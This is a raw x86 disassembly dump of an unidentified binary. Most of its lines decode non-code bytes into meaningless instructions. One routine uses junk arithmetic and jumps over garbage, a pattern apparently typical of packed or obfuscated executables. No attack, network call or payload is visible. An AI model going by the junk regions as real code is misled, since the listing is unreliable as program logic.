  41512f:	cmp    edx,DWORD PTR [edi+0x1c]
  415132:	push   ebp
  415133:	adc    cl,ch
  415135:	and    BYTE PTR ds:0x8248a344,ch
  41513b:	mov    edi,DWORD PTR [edx-0x3d0d452f]
  415141:	mov    bh,0x8e
  415143:	loope  0x415198
  415145:	sub    DWORD PTR [eax+0x59305cff],esi
  41514b:	sub    bl,BYTE PTR [si+0x2a]
  41514f:	in     al,0x4c
  415151:	jne    0x41515f
  415153:	ret    
  415154:	add    al,0x90
  415156:	data16 jno 0x41514a
  415159:	mov    ecx,0x3d8e3047
  41515e:	xor    bl,ch
  415160:	xor    eax,eax
  415162:	add    DWORD PTR [eax],esp
  415164:	push   0x2e
  415166:	and    eax,0xfe316f8
  41516b:	mov    cl,0x4d
  41516d:	retf   
  41516e:	inc    ecx
  41516f:	pushf  
  415170:	inc    eax
  415171:	repz loopne 0x415125
  415174:	xchg   DWORD PTR ds:0x42164005,eax
  41517a:	push   ds
  41517b:	xor    DWORD PTR [edi+0x3f],ebx
  41517e:	es (bad) 
  415180:	fstp   DWORD PTR [esi]
  415182:	std    
  415183:	shl    DWORD PTR [eax],0x27
  415186:	mov    bl,0xe6
  415188:	enter  0xbda,0x7d
  41518c:	in     eax,dx
  41518d:	xlat   BYTE PTR ds:[ebx]
  41518e:	in     eax,0xc8
  415190:	cmp    BYTE PTR [eax],ch
  415192:	sbb    DWORD PTR [eax],esp
  415194:	pop    eax
  415195:	or     DWORD PTR [edi+0x2a22936a],edi
  41519b:	xchg   ecx,eax
  41519c:	dec    esp
  41519d:	scas   eax,DWORD PTR es:[edi]
  41519e:	fdiv   QWORD PTR [ebp-0x6]
  4151a1:	ret    0xf73c
  4151a4:	mov    al,0x3
  4151a6:	test   ebx,edx
  4151a8:	shr    DWORD PTR [edi-0x19aee211],cl
  4151ae:	ror    DWORD PTR [ebp+0x61],1
  4151b1:	popa   
  4151b2:	sbb    bh,BYTE PTR [ebx]
  4151b4:	jecxz  0x415199
  4151b6:	add    bl,BYTE PTR [esi+0x37]
  4151b9:	add    bl,BYTE PTR [edx+0x55]
  4151bc:	fmul   DWORD PTR [esi+0x1f]
  4151bf:	lea    esp,[ecx-0x24]
  4151c2:	xchg   DWORD PTR [edx-0x67972fc9],esp
  4151c8:	cmp    eax,0x64b6f931
  4151cd:	retf   0xf46
  4151d0:	or     eax,0x8bde936b
  4151d5:	push   esp
  4151d6:	and    al,0x14
  4151d8:	sub    DWORD PTR [eax],ecx
  4151da:	sbb    DWORD PTR [eax+0x4],edx
  4151dd:	mov    eax,DWORD PTR [esp+0xc]
  4151e1:	or     DWORD PTR [eax],0xca7da575
  4151e7:	or     DWORD PTR [eax+0x4],0x9c1b89e8
  4151ee:	lea    eax,[esp+0x18]
  4151f2:	push   eax
  4151f3:	lea    eax,[esp+0x24]
  4151f7:	push   eax
  4151f8:	call   0x4127df
  4151fd:	mov    eax,DWORD PTR [esp+0x18]
  415201:	mov    ecx,DWORD PTR [esp+0x1c]
  415205:	push   DWORD PTR [ebp+0x18]
  415208:	mov    ebx,DWORD PTR [ebp+0xc]
  41520b:	push   DWORD PTR [ebp+0x14]
  41520e:	mov    esi,DWORD PTR [ebp+0x8]
  415211:	push   DWORD PTR [ebp+0x10]
  415214:	push   DWORD PTR [esp+0x20]
  415218:	push   DWORD PTR [esp+0x20]
  41521c:	push   DWORD PTR [esp+0x38]
  415220:	push   DWORD PTR [esp+0x38]
  415224:	call   0x401000
  415229:	pop    esi
  41522a:	pop    ebx
  41522b:	mov    esp,ebp
  41522d:	pop    ebp
  41522e:	ret    0x14
  415231:	push   ebp
  415232:	mov    ebp,esp
  415234:	sub    esp,0x30
  415237:	mov    DWORD PTR [ebp-0x24],0x7c16
  41523e:	mov    DWORD PTR [ebp-0x20],0x53bd
  415245:	mov    DWORD PTR [ebp-0x18],0x3bd5
  41524c:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  415253:	mov    DWORD PTR [ebp-0xc],0x4b9d
  41525a:	mov    DWORD PTR [ebp-0x8],0x7e48
  415261:	mov    DWORD PTR [ebp-0x4],0x604b
  415268:	mov    DWORD PTR [ebp-0x30],0x5b69
  41526f:	mov    DWORD PTR [ebp-0x2c],0x4521
  415276:	mov    DWORD PTR [ebp-0x28],0x2979
  41527d:	mov    DWORD PTR [ebp-0x14],0x9e8
  415284:	mov    DWORD PTR [ebp-0x10],0x40e5
  41528b:	mov    ecx,DWORD PTR [ebp-0x4]
  41528e:	mov    eax,DWORD PTR [ebp-0x8]
  415291:	add    ecx,0x1d04
  415297:	xor    ecx,eax
  415299:	mov    eax,DWORD PTR [ebp-0xc]
  41529c:	and    ecx,0x6f79
  4152a2:	imul   ecx,eax
  4152a5:	xor    ecx,0xe33ab1
  4152ab:	push   esi
  4152ac:	mov    DWORD PTR [ebp-0x4],0x5989
  4152b3:	mov    DWORD PTR [ebp-0x8],0x402c1
  4152ba:	mov    DWORD PTR [ebp-0xc],0x4114
  4152c1:	mov    eax,DWORD PTR [ebp-0xc]
  4152c4:	mov    esi,DWORD PTR [ebp-0x8]
  4152c7:	xor    edx,edx
  4152c9:	sub    eax,0x6cb6
  4152ce:	div    esi
  4152d0:	mov    edx,DWORD PTR [ebp-0x4]
  4152d3:	mov    esi,DWORD PTR [ebp+0xc]
  4152d6:	or     eax,edx
  4152d8:	xor    eax,0x67f1
  4152dd:	mov    edx,ecx
  4152df:	sub    edx,eax
  4152e1:	mov    DWORD PTR [ebp-0x4],edx
  4152e4:	mov    eax,DWORD PTR [ebp-0x4]
  4152e7:	mov    edx,DWORD PTR [ebp-0x4]
  4152ea:	mov    dl,BYTE PTR [edx+esi*1]
  4152ed:	mov    esi,DWORD PTR [ebp+0x8]
  4152f0:	mov    BYTE PTR [eax+esi*1],dl
  4152f3:	jmp    0x415646
  4152f8:	mov    cl,0x4a
  4152fa:	aas    
  4152fb:	(bad)  
  4152fc:	sbb    bh,BYTE PTR [edx-0x5f]
  4152ff:	sub    dh,BYTE PTR [esi-0x1b81e474]
  415305:	(bad)  
  415306:	mov    ecx,0x160ebc7c
  41530b:	sbb    BYTE PTR [ebp-0x71e7e7ee],dh
  415311:	enter  0xe090,0x73
  415315:	mov    edi,0x8ef03845
  41531a:	mov    BYTE PTR [esi-0x695a7385],dl
  415320:	pop    edx
  415321:	sbb    DWORD PTR [ebp-0xf928462],ebx
  415327:	sub    al,0x49
  415329:	xor    eax,0xad1b9131
  41532e:	add    edx,edi
  415330:	xor    BYTE PTR ds:0x9d07f2d9,al
  415336:	xor    al,0x65
  415338:	cmp    cl,cl
  41533a:	out    0x7a,eax
  41533c:	inc    esp
  41533d:	mov    ecx,esi
  41533f:	mov    ecx,0x22da4bce
  415344:	in     al,0x2d
  415346:	fucomi st,st(5)
  415348:	and    BYTE PTR [eax+0x13dec967],al
  41534e:	das    
  41534f:	sbb    edx,0x15
  415352:	xchg   edx,eax
  415353:	inc    cl
  415355:	icebp  
  415356:	mov    al,0xa5
  415358:	ss jns 0x4152e3
  41535b:	xor    eax,0x93d7bfb0
  415360:	lods   eax,DWORD PTR ds:[esi]
  415361:	and    eax,DWORD PTR [eax-0x34]
  415364:	jns    0x415393
  415366:	inc    edi
  415367:	pop    ebx
  415369:	stos   DWORD PTR es:[edi],eax
  41536a:	sub    ecx,DWORD PTR [eax]
  41536c:	jae    0x4153dc
  41536e:	mov    ds:0x920025d7,eax
  415373:	ins    DWORD PTR es:[edi],dx
  415374:	inc    edx
  415375:	mov    bh,0x4
  415377:	jo     0x4153ec
  415379:	mov    ebp,0x80810041
  41537e:	ret    0x90e
  415381:	imul   ebp,DWORD PTR [esi+0x4f6e018],0x77
  415388:	xchg   ebx,eax
  415389:	loop   0x41535f
  41538b:	push   ecx
  41538c:	frstor [ebp-0x5f]
  41538f:	gs out 0x92,eax
  415392:	mov    DWORD PTR [edx+0x2a],esp
  415395:	mov    dl,0x16
  415397:	lahf   
  415398:	and    BYTE PTR [ecx-0x5f277726],dh
  41539e:	lods   eax,DWORD PTR ds:[esi]
  41539f:	jg     0x4153f9
  4153a1:	pop    ebx
  4153a2:	loop   0x4153be
  4153a4:	adc    ebp,edi
  4153a6:	mov    edi,0x7c7dcdaa
  4153ab:	cmc    
  4153ac:	pop    esp
  4153ad:	mov    esp,0xe309b7bb
  4153b2:	sub    DWORD PTR [esi],edi
  4153b4:	test   DWORD PTR [esi],edx
  4153b6:	out    dx,eax
  4153b7:	(bad)  
  4153b8:	cdq    
  4153b9:	inc    esi
  4153ba:	aam    0x64
  4153bc:	jbe    0x4153d4
  4153be:	sti    
  4153bf:	int3   
  4153c0:	iret   
  4153c1:	cmp    BYTE PTR [ebp-0xbe5f73],ch
  4153c7:	retf   
  4153c8:	popa   
  4153c9:	or     BYTE PTR es:[esi+ecx*8+0x62],cl
  4153ce:	mov    ecx,0x91c3a463
  4153d3:	add    cl,cl
  4153d5:	sbb    BYTE PTR [esi-0x7e],0x95
  4153d9:	std    
  4153da:	pop    ebx
  4153db:	cli    
  4153dc:	and    DWORD PTR [esi+0x30dfc40c],edx
  4153e2:	jb     0x415409
  4153e4:	add    ebp,DWORD PTR [ebx+esi*1-0x5d40d951]
  4153eb:	lock aam 0x7d
  4153ee:	in     eax,0x44
  4153f0:	enter  0x25d4,0x9d
  4153f4:	gs scas eax,DWORD PTR es:[edi]
  4153f6:	or     dl,dh
  4153f8:	dec    ebp
  4153f9:	es inc edx
  4153fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153fc:	(bad)  
  4153fe:	out    dx,eax
  4153ff:	call   0x411e:0xdfe0bc8a
  415406:	jne    0x41546c
  415408:	xor    al,0xab
  41540a:	and    al,0xf3
  41540c:	js     0x4153d9
  41540e:	shr    BYTE PTR [edx],0x74
  415411:	push   eax
  415412:	(bad)  
  415414:	push   ecx
  415415:	mov    dl,dl
  415417:	cs inc ebx
  415419:	pushf  
  41541a:	cwde   
  41541b:	add    BYTE PTR [edi],bl
  41541d:	push   esp
  41541e:	pop    esi
  41541f:	inc    ecx
  415420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415421:	pop    esp
  415422:	fstp   DWORD PTR [edi-0x7a3f7218]
  415428:	push   edi
  415429:	mov    ebp,DWORD PTR [esi]
  41542b:	cmc    
  41542c:	mov    ecx,0xfec8a2ea
  415431:	cwde   
  415432:	das    
  415433:	clc    
  415434:	(bad)
  415437:	icebp  
  415438:	and    cl,ah
  41543a:	jecxz  0x4153c7
  41543c:	push   edx
  41543d:	dec    ebp
  41543e:	push   ss
  41543f:	inc    ebx
  415440:	dec    esp
  415441:	loope  0x4153da
  415443:	shl    BYTE PTR [esi],1
  415445:	psubusb mm1,QWORD PTR [esi+0x4b]
  415449:	and    ah,bh
  41544b:	test   BYTE PTR ds:0x2795a0dd,al
  415451:	jmp    0x4204c9e4
  415456:	mov    edi,0x7132ed46
  41545b:	pop    ds
  41545c:	pop    ecx
  41545d:	sti    
  41545e:	cdq    
  41545f:	jp     0x41545d
  415461:	dec    ecx
  415462:	jno    0x415491
  415464:	std    
  415465:	jl     0x415462
  415467:	add    BYTE PTR [edx-0x5c02bc15],0x50
  41546e:	pop    ss
  41546f:	stos   BYTE PTR es:[edi],al
  415470:	jp     0x41543c
  415472:	out    0x96,eax
  415474:	mov    ebx,0x6fd71b4f
  415479:	nop
  41547a:	fs into 
  41547c:	fisttp QWORD PTR gs:[eax]
  41547f:	loope  0x415464
  415481:	cmp    DWORD PTR [esi+0x48],esi
  415484:	jne    0x41545c
  415486:	jno    0x415499
  415488:	jle    0x41548a
  41548a:	retf   
  41548b:	test   ecx,esp
  41548d:	mov    bh,0x48
  41548f:	or     esp,DWORD PTR [esi-0x5]
  415492:	jnp    0x415418
  415494:	jne    0x4154f9
  415496:	push   edi
  415497:	enter  0x30b6,0x38
  41549b:	mov    ds:0x26f3d556,eax
  4154a0:	les    esi,FWORD PTR [ebp-0x1a]
  4154a3:	pop    ds
  4154a4:	jae    0x4154a1
  4154a6:	mov    ds:0xfb3a1490,al
  4154ab:	cmp    esp,DWORD PTR [ebp-0x35]
  4154ae:	ret    
  4154af:	adc    eax,0x4368cda2
  4154b4:	(bad)  [ecx-0x74]
  4154b7:	dec    ebx
  4154b8:	sub    DWORD PTR [edi-0x14b9a14d],eax
  4154be:	push   es
  4154bf:	pusha  
  4154c0:	cld    
  4154c1:	fist   DWORD PTR [esi+0x40f7bff1]
  4154c7:	arpl   WORD PTR [eax+0x27],cx
  4154ca:	or     al,0xb7
  4154cc:	sub    DWORD PTR [esi+0x2b],ecx
  4154cf:	jle    0x4154ce
  4154d1:	cmp    al,0xcf
  4154d3:	shl    BYTE PTR [ecx+edx*1],0x25
  4154d7:	jle    0x41553c
  4154d9:	jecxz  0x4154fb
  4154db:	xor    al,0x6a
  4154dd:	inc    ecx
  4154de:	enter  0x28d2,0x37
  4154e2:	inc    ebx
  4154e3:	xor    eax,0x61ebdbd7
  4154e8:	jb     0x4154d7
  4154ea:	jnp    0x4154e8
  4154ec:	lods   al,BYTE PTR ds:[esi]
  4154ed:	das    
  4154ee:	mov    ds:0x51926800,al
  4154f3:	mov    ds:0xa3746227,eax
  4154f8:	mov    dh,0x50
  4154fa:	push   esp
  4154fb:	icebp  
  4154fc:	or     esp,DWORD PTR [eax+0x72]
  4154ff:	mov    edi,0x19aa1944
  415504:	add    al,0x46
  415506:	mov    edi,ss
  415508:	in     eax,dx
  415509:	mov    ebx,edx
  41550b:	call   0xa2ee:0x10451fa8
  415512:	and    edi,edx
  415514:	pusha  
  415515:	out    0xb3,al
  415517:	retf   0xd022
  41551a:	ss cmc 
  41551c:	test   BYTE PTR [ebp+ebp*4+0x5be4895f],ah
  415523:	lds    ebx,FWORD PTR [ebx]
  415525:	mov    dl,0xb1
  415527:	lea    ebx,[ebx+0x76]
  41552a:	jb     0x415544
  41552c:	jmp    0x2d6b:0xa962a166
  415533:	imul   esp,esi,0x13e11bd6
  415539:	shl    DWORD PTR [ecx+ecx*4+0x76],0x2a
  41553e:	hlt    
  41553f:	arpl   WORD PTR [esi],dx
  415541:	or     BYTE PTR [ecx+0x4f],bl
  415544:	imul   eax,DWORD PTR [edi-0x1cb6beb2],0x2a
  41554b:	mov    dh,0x8c
  41554d:	pop    ebp
  41554e:	push   ds
  41554f:	rcl    DWORD PTR ds:0x92214d5e,cl
  415555:	adc    al,0xcb
  415557:	pop    esp
  415558:	stos   BYTE PTR es:[edi],al
  415559:	xchg   ebx,eax
  41555a:	inc    edi
  41555b:	sbb    ecx,ebp
  41555d:	dec    ebp
  41555e:	and    edx,DWORD PTR [edi+ebx*8+0x7d]
  415562:	retf   0x6f36
  415565:	dec    esp
  415566:	sub    dh,BYTE PTR [esi-0x3d]
  415569:	nop
  41556a:	inc    edx
  41556b:	jmp    0x41551c
  41556d:	mov    ecx,0x5c34584a
  415572:	inc    ebp
  415573:	push   ecx
  415574:	push   esp
  415575:	lods   al,BYTE PTR ds:[esi]
  415576:	test   eax,0x791fb3a2
  41557b:	or     eax,0xb45dcc36
  415580:	dec    eax
  415581:	icebp  
  415582:	repnz push eax
  415584:	shl    DWORD PTR [ebx],cl
  415586:	dec    edi
  415587:	xor    al,0xec
  415589:	pop    ebx
  41558a:	xlat   BYTE PTR ds:[ebx]
  41558b:	ds or  eax,0xd11323a3
  415591:	repnz sbb DWORD PTR [esi-0x38a1efd3],esp
  415598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415599:	jno    0x415558
  41559b:	mov    bh,0x3a
  41559d:	mov    bl,0xdd
  41559f:	inc    esi
  4155a0:	cmp    eax,0xb37f098c
  4155a5:	imul   esp,edi,0xd87e4f9d
  4155ab:	mov    dh,0xf6
  4155ad:	popa   
  4155ae:	jbe    0x415591
  4155b0:	call   0x7f9da2a0
  4155b5:	add    eax,0x958248f5
  4155ba:	scas   eax,DWORD PTR es:[edi]
  4155bb:	mov    eax,0x9a41a6cf
  4155c0:	dec    BYTE PTR [ebp+0x63]
  4155c3:	inc    edi
  4155c4:	add    edx,DWORD PTR [ebx]
  4155c6:	jp     0x41555f
  4155c8:	add    al,0xb1
  4155ca:	adc    BYTE PTR [ecx],dh
  4155cc:	outs   dx,DWORD PTR ds:[esi]
  4155cd:	dec    esi
  4155ce:	xchg   esi,eax
  4155cf:	pop    edx
  4155d0:	inc    ebx
  4155d1:	pop    esi
  4155d2:	dec    esp
  4155d3:	aam    0x38
  4155d5:	dec    ebx
  4155d6:	call   0x53113f78
  4155db:	add    ecx,DWORD PTR [ecx]
  4155dd:	mov    sp,0x91cd
  4155e1:	icebp  
  4155e2:	out    dx,al
  4155e3:	jne    0x415639
  4155e5:	mov    al,0xad
  4155e7:	int3   
  4155e8:	lock int3 
  4155ea:	lods   al,BYTE PTR ds:[esi]
  4155eb:	and    al,0x69
  4155ed:	fwait
  4155ee:	sti    
  4155ef:	xchg   edi,eax
  4155f0:	imul   edi,DWORD PTR [ecx],0x21
  4155f3:	aaa    
  4155f4:	outs   dx,DWORD PTR ds:[esi]
  4155f5:	or     BYTE PTR ds:0x7410f331,ch
  4155fb:	inc    esi
  4155fc:	mov    bh,0xdc
  4155fe:	jg     0x415646
  415600:	sub    dh,BYTE PTR [edx-0x4e1efc0f]
  415606:	cld    
  415607:	push   edi
  415608:	sub    BYTE PTR [eax],ah
  41560a:	sbb    esp,DWORD PTR [edx]
  41560c:	jl     0x4155e7
  41560e:	mov    ch,0x34
  415610:	ja     0x4155e2
  415612:	mov    WORD PTR [edx-0x35f226f1],cs
  415618:	pop    ebx
  415619:	retf   0xc82b
  41561c:	cwde   
  41561d:	imul   eax,DWORD PTR [edx+edx*1+0x54],0x169c5110
  415625:	xchg   ebx,eax
  415626:	hlt    
  415627:	xlat   BYTE PTR ds:[ebx]
  415628:	mov    ds:0xe09686c9,al
  41562d:	sbb    eax,eax
  41562f:	push   ecx
  415630:	jnp    0x41567e
  415632:	cld    
  415633:	xchg   BYTE PTR [ecx+0xf040176],cl
  415639:	lea    edx,[ebp+0xb]
  41563c:	mov    DWORD PTR [esi-0x2db20c7a],0x7830e5e6
  415646:	mov    eax,DWORD PTR [ebp-0x10]
  415649:	mov    edx,DWORD PTR [ebp-0x14]
  41564c:	imul   eax,eax,0x43bd290
  415652:	and    eax,edx
  415654:	or     eax,0x1a40
  415659:	xor    eax,0x1ac1
  41565e:	add    ecx,eax
  415660:	mov    eax,DWORD PTR [ebp-0x18]
  415663:	mov    edx,0x7380
  415668:	sub    edx,eax
  41566a:	add    edx,DWORD PTR [ebp-0x1c]
  41566d:	jmp    0x4159c0
  415672:	pop    esp
  415673:	pushf  
  415674:	lds    eax,FWORD PTR [ebp+eax*2+0x1c]
  415678:	pop    esp
  415679:	pushf  
  41567a:	push   ss
  41567b:	cwde   
  41567c:	pop    ebx
  41567d:	jo     0x41567a
  41567f:	mov    ebp,0x858aa16
  415684:	push   ss
  415685:	sbb    BYTE PTR [ebp-0x6e7e7ee],dh
  41568b:	rcl    DWORD PTR [ecx+ebp*1],1
  41568e:	sub    DWORD PTR [eax],esp
  415690:	pusha  
  415691:	icebp  
  415692:	adc    eax,0xcbb67a29
  415697:	ja     0x4156c0
  415699:	push   ebx
  41569a:	andnps xmm0,XMMWORD PTR [eax-0x1a]
  41569e:	inc    ebp
  41569f:	leave  
  4156a0:	aad    0x4e
  4156a2:	test   al,0x8b
  4156a4:	jns    0x4156aa
  4156a6:	ins    BYTE PTR es:[edi],dx
  4156a7:	lods   al,BYTE PTR ds:[esi]
  4156a8:	and    eax,0x4540f1cc
  4156ad:	cmp    BYTE PTR [ebx+0x1334295c],bl
  4156b3:	and    al,BYTE PTR ds:0xca5aa022
  4156b9:	or     DWORD PTR [esi+0x11],ecx
  4156bc:	mov    edi,0xf539a26d
  4156c1:	out    0x62,al
  4156c3:	iret   
  4156c4:	les    esi,FWORD PTR [ebp+0x65]
  4156c7:	mov    esi,0xe887c5e
  4156cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156cd:	xor    dl,dl
  4156cf:	push   ebx
  4156d0:	sbb    BYTE PTR [edi],bh
  4156d2:	and    DWORD PTR [edi],esi
  4156d4:	push   0x1ebdcf1
  4156d9:	mov    ds:0x26ebf0d7,eax
  4156de:	dec    esi
  4156df:	mov    BYTE PTR ds:0x69da2991,dh
  4156e5:	(bad)  
  4156e6:	push   ss
  4156e7:	dec    edx
  4156e8:	cmp    eax,0x70593260
  4156ed:	bound  ebx,QWORD PTR [ecx]
  4156ef:	in     al,0x40
  4156f1:	inc    esp
  4156f2:	mov    ebx,0xcb75bdba
  4156f7:	cmp    edx,DWORD PTR [edi-0x354f5044]
  4156fd:	dec    edi
  4156fe:	mov    bh,0xfa
  415700:	mov    ebp,0x7cd22f50
  415705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415706:	fs ja  0x4156e9
  415709:	xor    al,0x77
  41570b:	and    DWORD PTR [eax],esi
  41570d:	clc    
  41570e:	test   DWORD PTR [eax-0x7a],ebx
  415711:	jp     0x415771
  415713:	cmp    al,0xcf
  415715:	push   0x4d
  415717:	loop   0x4156ae
  415719:	mov    ecx,0xc9b8ee7a
  41571e:	rcr    DWORD PTR [esi+0x3442868a],0x2d
  415725:	jns    0x41574c
  415727:	in     al,0x5f
  415729:	mov    eax,ds:0xc8952064
  41572e:	push   0xffffff92
  415730:	jecxz  0x4156f4
  415732:	pop    eax
  415733:	adc    eax,DWORD PTR [ecx-0x30]
  415736:	inc    ebx
  415737:	int3   
  415738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415739:	cmp    BYTE PTR [ecx-0x69],dh
  41573c:	xchg   esi,edi
  41573e:	sbb    al,0xda
  415740:	int3   
  415741:	add    DWORD PTR gs:[edx+0x52fbe0bf],ebp
  415748:	rcl    BYTE PTR [edi+0x3],1
  41574b:	sub    eax,0x7486ff20
  415750:	dec    ecx
  415751:	and    ecx,DWORD PTR [eax-0x36bc7799]
  415757:	cmp    DWORD PTR [ecx-0x13],0x1a
  41575b:	scas   al,BYTE PTR es:[edi]
  41575c:	cwde   
  41575d:	addr16 mov ebp,0x8ebf8747
  415763:	retf   
  415764:	push   0xcea55908
  415769:	pop    edi
  41576a:	(bad)  
  41576b:	mov    esp,0x49d46eb6
  415770:	or     DWORD PTR [ebp-0x35],ebp
  415773:	in     eax,dx
  415774:	mov    ebp,0x13c08c9d
  415779:	inc    ecx
  41577a:	lds    ecx,FWORD PTR [ecx+0x5236aaa3]
  415780:	call   0xf147:0x1b99578c
  415787:	pusha  
  415788:	sub    cl,dl
  41578a:	xor    BYTE PTR [ebx+0x5a],ch
  41578d:	dec    edx
  41578e:	addr16 int 0xc3
  415791:	cli    
  415792:	lods   eax,DWORD PTR ds:[esi]
  415793:	std    
  415794:	loope  0x4157a2
  415796:	sahf   
  415797:	or     BYTE PTR [esp+edx*1-0xa0883cd],bl
  41579e:	outs   dx,BYTE PTR ds:[esi]
  41579f:	pop    esp
  4157a0:	sub    cl,al
  4157a2:	loope  0x4157fa
  4157a4:	xchg   DWORD PTR [edx+ebp*8],esi
  4157a7:	sub    BYTE PTR [edi-0xb],ah
  4157aa:	xchg   DWORD PTR [ebx-0x7861f954],ebp
  4157b0:	mov    esi,0xf100ba79
  4157b5:	enter  0x6b1b,0x3
  4157b9:	int3   
  4157ba:	mov    bh,0x5a
  4157bc:	xchg   ecx,eax
  4157bd:	sub    DWORD PTR [ebx+0x3707f4cc],esi
  4157c3:	inc    ebp
  4157c4:	push   esp
  4157c5:	jmp    0x41577f
  4157c7:	mov    eax,ds:0xcd3ca8c1
  4157cc:	test   edi,ebx
  4157ce:	(bad)  
  4157cf:	or     bh,BYTE PTR [edi+0x735ce2f8]
  4157d5:	cmc    
  4157d6:	xchg   edx,edx
  4157d8:	and    bh,BYTE PTR [ebx]
  4157da:	or     eax,0x269477e2
  4157df:	xchg   ebp,eax
  4157e0:	out    dx,eax
  4157e1:	idiv   DWORD PTR [edx-0x182ef008]
  4157e7:	dec    ebx
  4157e8:	fcmovbe st,st(2)
  4157ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157eb:	push   ss
  4157ec:	dec    ebp
  4157ed:	mov    edx,0xf1981299
  4157f2:	lods   eax,DWORD PTR ds:[esi]
  4157f3:	ficomp DWORD PTR [ebp+0x6acf64db]
  4157f9:	ficom  DWORD PTR [edi]
  4157fb:	add    BYTE PTR [ebx+0x26],0x6f
  4157ff:	fisubr DWORD PTR [ebx+0x48]
  415802:	fst    QWORD PTR [ecx+esi*2]
  415805:	fdiv   QWORD PTR [esi-0x2c3c51ad]
  41580b:	mov    eax,0x1131dbae
  415810:	imul   edx,DWORD PTR [edx],0xffffffbe
  415813:	xor    BYTE PTR [esi],0x81
  415816:	pop    ebp
  415817:	cwde   
  415818:	mov    bl,0x97
  41581a:	cmp    bh,dl
  41581c:	loop   0x415878
  41581e:	dec    edx
  41581f:	lea    ebx,[esi+0x201be182]
  415825:	repz jnp 0x415880
  415828:	retf   0x4b88
  41582b:	and    BYTE PTR [ebp+0x4d8ca8a1],ah
  415831:	enter  0xd175,0xba
  415835:	mov    esp,DWORD PTR [esi+edi*8-0x1c]
  415839:	popa   
  41583a:	xor    ecx,0xffffff8f
  41583d:	mov    ds:0xb1711b1d,eax
  415842:	das    
  415843:	inc    ebp
  415844:	fwait
  415845:	iret   
  415846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415847:	cmp    DWORD PTR [edi+0x6b41114],edi
  41584d:	mov    esi,0xd07edfa
  415852:	imul   esi,DWORD PTR [ecx],0xffffffe3
  415855:	adc    ecx,esp
  415857:	fxch   st(4)
  41585a:	mov    eax,ss:0x1ef8bb38
  415860:	repz and edi,ecx
  415863:	lock push es
  415865:	iret   
  415866:	cdq    
  415867:	push   es
  415868:	sub    eax,DWORD PTR [esi-0x63]
  41586b:	lea    ebp,[ebp-0x53]
  41586e:	mov    al,ds:0x653506d0
  415873:	adc    al,0x9f
  415875:	into   
  415876:	popa   
  415877:	out    0xea,eax
  415879:	popf   
  41587a:	push   ebp
  41587b:	xchg   edx,eax
  41587c:	jb     0x41587c
  41587e:	dec    edx
  41587f:	xor    ebp,DWORD PTR [ebp-0xf]
  415882:	xor    al,0xbc
  415884:	ss cli 
  415886:	icebp  
  415887:	ins    DWORD PTR es:[edi],dx
  415888:	not    DWORD PTR [edi]
  41588a:	xchg   BYTE PTR [edx+0x53],dl
  41588d:	outs   dx,BYTE PTR ds:[esi]
  41588e:	aam    0x11
  415890:	test   BYTE PTR [ecx],al
  415892:	push   0xb084d76a
  415897:	cmp    al,0x67
  415899:	ficomp DWORD PTR [esi+0x74ff5380]
  41589f:	rcr    BYTE PTR [eax-0x675d0cd4],cl
  4158a5:	out    0xf,eax
  4158a7:	out    0x22,eax
  4158a9:	sub    dh,BYTE PTR [edi+0x58da111]
  4158af:	mov    WORD PTR [ebp-0x71ce02ce],fs
  4158b5:	push   edi
  4158b6:	clc    
  4158b7:	cs add al,0x9c
  4158ba:	sub    DWORD PTR ds:0xd1d78429,esi
  4158c0:	jb     0x4158bc
  4158c2:	data16 sub al,0x56
  4158c5:	and    eax,0x23902281
  4158ca:	push   ds
  4158cb:	sbb    DWORD PTR [edi+edi*4+0x5dd4561e],esi
  4158d2:	ret    
  4158d3:	icebp  
  4158d4:	mov    ds:0xd58affa2,al
  4158d9:	ror    BYTE PTR [edi-0x15],0xa7
  4158dd:	jge    0x4158d5
  4158df:	xchg   esi,eax
  4158e0:	mov    ds:0x89567b21,al
  4158e5:	pop    ebp
  4158e6:	push   eax
  4158e7:	sub    eax,0xda0e35b0
  4158ec:	out    0xe6,eax
  4158ee:	(bad)  
  4158ef:	push   esi
  4158f0:	mov    ss,WORD PTR [ebx]
  4158f2:	lea    esi,[ebx-0x76]
  4158f5:	add    eax,0x1ecb82fa
  4158fa:	test   al,0xe5
  4158fc:	retf   
  4158fd:	and    al,0xa5
  4158ff:	imul   esp,DWORD PTR [eax-0x4ce425bf],0xfaf0ee21
  415909:	test   BYTE PTR [edi-0x36583a1b],al
  41590f:	pop    es
  415910:	xor    eax,0x29f32078
  415915:	hlt    
  415916:	call   0xfc8b:0x76e80c86
  41591d:	sbb    DWORD PTR [edi+0x2b36823f],ebp
  415923:	(bad)
  415926:	(bad)  
  415927:	mov    edi,0x6a65d360
  41592c:	sbb    eax,0xaaf3db9a
  415931:	loope  0x41593e
  415933:	mov    DWORD PTR [ecx+0x36],eax
  415936:	lock fistp DWORD PTR [edi+0x1f0faa96]
  41593d:	(bad)  
  41593e:	dec    ebx
  41593f:	cs jmp 0x9fb08a9a
  415945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415946:	push   cs
  415947:	pop    esp
  415948:	dec    ebp
  415949:	push   ecx
  41594a:	mov    esi,0xf2337ff9
  41594f:	add    DWORD PTR [edi+0x4ea806a5],ebx
  415955:	add    esp,DWORD PTR [edi-0x46]
  415958:	and    BYTE PTR [ebp+0x23ba13f9],dl
  41595e:	jp     0x4159dd
  415960:	and    DWORD PTR [ecx-0x32998422],ebx
  415966:	push   es
  415967:	or     ebx,DWORD PTR [ebp+0x51]
  41596a:	or     bl,BYTE PTR [ebp+0x6ac482ed]
  415970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415971:	mov    edx,0x9388e24b
  415976:	jl     0x41596a
  415978:	iret   
  415979:	sub    DWORD PTR [ecx],ebp
  41597b:	les    esp,FWORD PTR [ecx+0x39]
  41597e:	shl    BYTE PTR [ebp-0x5765b598],0x55
  415985:	retf   0xa1f
  415988:	push   cs
  415989:	push   ebp
  41598a:	pop    edx
  41598b:	and    ah,BYTE PTR [ebx]
